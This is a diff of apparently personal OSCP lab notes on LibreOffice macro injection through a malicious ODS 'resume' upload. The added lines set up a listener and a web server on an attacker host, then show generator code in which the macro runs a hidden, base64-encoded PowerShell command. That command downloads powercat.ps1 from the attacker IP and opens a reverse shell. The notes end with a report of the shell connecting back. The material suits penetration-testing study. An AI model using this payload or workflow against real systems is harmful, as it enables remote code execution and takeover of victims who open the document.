@@ -1,5 +1,50 @@
-ODT files only > LibreOffice Macro Injection
+```
+cd ~/Desktop/Tools/MMG-LO
+```
 
+With a few modifications to the generator, I adjusted the macro to download `powercat.ps1` from my Python3 web server and use it to establish a reverse shell.
+
+```
+gedit mmg-ods.py
+```
+
+Start listener on 4444
+```
+cd ~/Desktop/Tools && python3 penelope.py -p 4444 -O / --oscp-safe
+```
+
+Start python server to host powercat.ps1 on KALI ATTACKER
+```
+powercat && python -m http.server 
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `...SNIP...  
+if sys.argv[1] == 'windows':  
+  
+ vbacall = '''Set oShell = CreateObject("Wscript.Shell")  
+ oShell.Run'''  
+ build_payload = (f'IEX(New-Object System.Net.WebClient).DownloadString("http://${KaliIP}/powercat.ps1");powercat -c ${KaliIP} -p 4444 -e powershell')  
+ bytes_encoded = (base64.b64encode(bytes(build_payload, 'utf-16le')))  
+ base64payload = bytes_encoded.decode()  
+ payload = 'powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -e ' + base64payload  
+ print ("[" + Fore.GREEN + "+" + Fore.RESET + "] Payload: windows reverse shell")  
+ print ("[" + Fore.GREEN + "+" + Fore.RESET + "] Creating malicious .ods file\n")  
+ Macro_Gen()  
+...SNIP...`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+
+Next, I generated the malicious ODS file using Python3.
+
+**Command:** python3 mmg-ods.py windows 192.168.45.159 1337
+
+---
+
+ODT files only > LibreOffice Macro Injection
 
 Install LibreOffice
 ```
@@ -64,3 +109,8 @@ Go back to the web page and upload the newly created resume.
 ![[Pasted image 20260801130754.png]]
 
 We check our listener and after about 10 seconds we get a connection.
+
+---
+
+ODS file creation
+
